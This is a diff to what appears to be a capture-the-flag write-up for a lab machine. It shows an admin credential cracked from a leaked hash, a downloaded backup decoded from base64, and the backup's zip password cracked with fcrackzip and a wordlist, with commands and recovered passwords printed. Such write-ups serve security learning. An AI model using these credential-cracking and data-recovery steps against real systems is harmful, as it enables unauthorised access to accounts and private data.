@@ -110,4 +110,27 @@ By changing this to `/api/users` the response returns a list of users and their 
 Searching online for the admin's hash completes a set of valid admin credentials: `myP14ceAdm1nAcc0uNT:manchester`.
 
 ### 3. Log in to the admin page
+The admin's dashboard has a single link to download a backup.
+```bash
+divip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
+└──╼ [★]$ file myplace.backup 
+myplace.backup: ASCII text, with very long lines, with no line terminators
+```
+The file's contents is base64 encoded.
+```bash
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
+└──╼ [★]$ cat myplace.backup | base64 -d > backup.zip
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
+└──╼ [★]$ file backup.zip 
+backup.zip: Zip archive data, at least v1.0 to extract
+```
+The zipfile has a password, but it does appear in a wordlist so it can be recovered.
+```bash
+─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-gnmqkxd0jn]─[~/Downloads]
+└──╼ [★]$ fcrackzip --dictionary -p rockyou.txt -u backup.zip 
+
+
+PASSWORD FOUND!!!!: pw == magicword
+```
+The backup file can now be unzipped, which recovers the source code to the entire application.
 
